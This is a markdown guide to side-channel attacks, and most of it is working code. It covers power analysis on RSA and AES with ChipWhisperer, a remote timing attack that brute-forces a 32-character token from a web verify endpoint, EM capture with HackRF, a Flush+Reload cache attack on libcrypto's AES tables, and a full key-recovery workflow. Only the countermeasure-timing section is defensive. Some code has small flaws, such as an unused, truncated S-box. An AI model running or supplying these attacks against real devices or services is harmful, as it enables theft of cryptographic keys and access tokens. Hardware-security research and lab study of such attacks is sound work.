# Side-Channel Attack Guide

> Practical techniques for extracting cryptographic keys and secrets through physical emanations: power consumption analysis, timing variations, and electromagnetic emissions from target devices.

## 1. Power Analysis Setup with ChipWhisperer

Power analysis exploits the correlation between data being processed and instantaneous power consumption.

```bash
# Install ChipWhisperer
pip install chipwhisperer

# Connect ChipWhisperer Lite/Pro to target
# Shunt resistor in VCC line measures current draw
# Trigger pin connected to target GPIO (signals crypto start)

# Verify connection
python3 -c "
import chipwhisperer as cw
scope = cw.scope()
print(f'Connected: {scope.get_name()}')
print(f'FW Version: {scope.fw_version_str}')
scope.dis()
"
```

## 2. Simple Power Analysis (SPA)

```python
# SPA: Visually distinguish operations from a single trace
import chipwhisperer as cw
import numpy as np
import matplotlib.pyplot as plt

# Capture setup
scope = cw.scope()
target = cw.target(scope)
scope.default_setup()
scope.adc.samples = 24000
scope.adc.offset = 0

# Capture a single trace during RSA operation
scope.arm()
target.simpleserial_write('r', bytearray(16))  # Trigger RSA
scope.capture()
trace = scope.get_last_trace()

# Plot - square vs multiply operations visible in RSA
plt.figure(figsize=(20, 4))
plt.plot(trace)
plt.title('SPA on RSA - Square and Multiply Pattern')
plt.xlabel('Sample')
plt.ylabel('Power')
plt.savefig('spa_rsa_trace.png', dpi=150)

# Identify bit pattern: tall peaks = multiply (bit=1), short = square-only (bit=0)
# This directly reveals the private key bits
```

## 3. Differential Power Analysis (DPA) on AES

```python
# DPA: Statistical analysis across many traces to extract AES key
import chipwhisperer as cw
import chipwhisperer.analyzer as cwa
import numpy as np

# Capture phase: collect traces with known plaintexts
scope = cw.scope()
target = cw.target(scope)
scope.default_setup()
scope.adc.samples = 5000

num_traces = 2500
traces = np.zeros((num_traces, scope.adc.samples))
textin = np.zeros((num_traces, 16), dtype=np.uint8)

for i in range(num_traces):
    # Random plaintext
    pt = bytearray(np.random.randint(0, 256, 16, dtype=np.uint8))
    textin[i] = np.array(pt)

    scope.arm()
    target.simpleserial_write('p', pt)
    scope.capture()
    traces[i] = scope.get_last_trace()

    if i % 500 == 0:
        print(f'Captured {i}/{num_traces} traces')

# Analysis phase: Correlation Power Analysis (CPA)
# Attack first byte of AES key
sbox = [
    0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5,  # ... full S-box
]

# For each key hypothesis (0-255), compute correlation
correlations = np.zeros(256)
for key_guess in range(256):
    # Hypothetical intermediate values
    hyp = np.array([cw.aes_sbox[pt[0] ^ key_guess] for pt in textin])
    # Hamming weight model
    hw = np.array([bin(h).count('1') for h in hyp])
    # Correlate with each time sample
    for sample in range(traces.shape[1]):
        c = np.corrcoef(hw, traces[:, sample])[0, 1]
        if abs(c) > abs(correlations[key_guess]):
            correlations[key_guess] = c

best_key = np.argmax(np.abs(correlations))
print(f'Key byte 0: 0x{best_key:02x} (correlation: {correlations[best_key]:.4f})')
```

## 4. Timing Attack on Comparison Functions

```python
# Timing attack against byte-by-byte password comparison
import requests
import time
import numpy as np

target_url = 'https://target.com/api/verify'
known_bytes = ''
charset = '0123456789abcdef'

for position in range(32):  # 32-byte token
    timings = {}

    for char in charset:
        candidate = known_bytes + char + 'x' * (31 - position)
        measurements = []

        # Multiple measurements to reduce noise
        for _ in range(100):
            start = time.perf_counter_ns()
            requests.post(target_url, json={'token': candidate})
            elapsed = time.perf_counter_ns() - start
            measurements.append(elapsed)

        # Use median to reduce network jitter
        timings[char] = np.median(measurements)

    # Character with longest response time = correct byte
    best_char = max(timings, key=timings.get)
    known_bytes += best_char
    print(f'Position {position}: {best_char} (token so far: {known_bytes})')
```

## 5. Electromagnetic Side-Channel Analysis

```bash
# EM probe setup for near-field emissions
# Equipment: H-field probe, LNA (low-noise amplifier), oscilloscope/SDR

# Using HackRF as EM capture device
# Center frequency depends on target clock (e.g., 16MHz MCU)
hackrf_transfer -r em_capture.raw -f 16000000 -s 20000000 -g 40 -l 32

# Convert raw capture to analyzable format
python3 << 'EOF'
import numpy as np

# Read raw IQ samples
raw = np.fromfile('em_capture.raw', dtype=np.int8)
i_samples = raw[0::2].astype(np.float32)
q_samples = raw[1::2].astype(np.float32)

# Compute amplitude (power envelope)
amplitude = np.sqrt(i_samples**2 + q_samples**2)

# Segment into traces (aligned to trigger)
# Each crypto operation takes ~1000 samples at 20MSPS
trace_length = 1000
num_traces = len(amplitude) // trace_length
traces = amplitude[:num_traces * trace_length].reshape(num_traces, trace_length)

np.save('em_traces.npy', traces)
print(f'Captured {num_traces} traces of {trace_length} samples each')
EOF
```

## 6. Cache Timing Attacks (Flush+Reload)

```c
// Flush+Reload attack to extract AES key from shared library
// Compile: gcc -O2 -o flush_reload flush_reload.c

#include <stdio.h>
#include <stdint.h>
#include <x86intrin.h>

#define CACHE_HIT_THRESHOLD 80  // CPU-specific, calibrate first

// Measure access time to an address
static inline uint64_t measure_access(volatile char *addr) {
    uint64_t start = __rdtsc();
    *(volatile char *)addr;
    return __rdtsc() - start;
}

// Flush a cache line
static inline void flush(volatile char *addr) {
    _mm_clflush((void *)addr);
    _mm_mfence();
}

// Monitor T-table accesses during AES encryption
// te0_addr = address of Te0 lookup table in libcrypto.so
void monitor_aes_table(volatile char *te0_addr) {
    uint64_t timing;

    // Flush the table entries
    for (int i = 0; i < 256; i++) {
        flush(te0_addr + i * 64);  // 64-byte cache lines
    }

    // Wait for victim to perform AES
    usleep(100);

    // Reload and measure - cache hits reveal table indices accessed
    for (int i = 0; i < 256; i++) {
        timing = measure_access(te0_addr + i * 64);
        if (timing < CACHE_HIT_THRESHOLD) {
            printf("Te0[%d] accessed (timing: %lu)\n", i, timing);
            // This reveals plaintext XOR key byte
        }
    }
}
```

## 7. Countermeasure Evaluation

```python
# Test if target implements constant-time operations
# Measure timing variance across different inputs

import numpy as np
import time

def measure_crypto_timing(target_func, inputs, iterations=10000):
    """Measure timing distribution for different input classes."""
    results = {}

    for label, input_data in inputs.items():
        timings = []
        for _ in range(iterations):
            start = time.perf_counter_ns()
            target_func(input_data)
            elapsed = time.perf_counter_ns() - start
            timings.append(elapsed)

        results[label] = {
            'mean': np.mean(timings),
            'std': np.std(timings),
            'median': np.median(timings),
        }

    # Statistical test: if means differ significantly, timing leak exists
    labels = list(results.keys())
    for i in range(len(labels)):
        for j in range(i+1, len(labels)):
            diff = abs(results[labels[i]]['mean'] - results[labels[j]]['mean'])
            threshold = max(results[labels[i]]['std'], results[labels[j]]['std'])
            if diff > threshold:
                print(f'TIMING LEAK: {labels[i]} vs {labels[j]}, diff={diff:.0f}ns')
            else:
                print(f'OK: {labels[i]} vs {labels[j]}, diff={diff:.0f}ns (within noise)')

    return results
```

## 8. Practical Attack Workflow

```bash
# End-to-end side-channel attack workflow

# Step 1: Identify target crypto implementation
strings firmware.bin | grep -iE "(aes|rsa|ecdsa|sha|hmac)"
# Check if hardware crypto accelerator is used vs software

# Step 2: Determine measurement point
# - Power: shunt resistor on VCC/GND
# - EM: probe over crypto-relevant chip area
# - Timing: network response or GPIO toggle

# Step 3: Capture traces with ChipWhisperer
# jupyter notebook  # Use CW's Jupyter environment
# Run capture script (see sections above)

# Step 4: Align traces (critical for DPA success)
python3 -c "
import chipwhisperer.analyzer as cwa
import numpy as np

traces = np.load('captured_traces.npy')
# Sum of Absolute Differences (SAD) alignment
from chipwhisperer.analyzer.preprocessing import ResyncSAD
resync = ResyncSAD(traces)
aligned = resync.preprocess(ref_trace=0, max_shift=200)
np.save('aligned_traces.npy', aligned)
print(f'Aligned {len(aligned)} traces')
"

# Step 5: Run CPA attack
# Use Scared (Side-Channel Analysis framework)
pip install scared
python3 -c "
import scared
import numpy as np

traces = np.load('aligned_traces.npy')
plaintexts = np.load('plaintexts.npy')

# CPA attack on AES first round
container = scared.Container(traces, plaintexts)
attack = scared.CPAAttack(
    selection_function=scared.aes.selection_functions.SubBytes,
    model=scared.HammingWeight(),
    discriminant=scared.maxabs
)
attack.run(container)
found_key = attack.scores.argmax(axis=0)
print(f'Recovered key: {found_key.tobytes().hex()}')
"
```
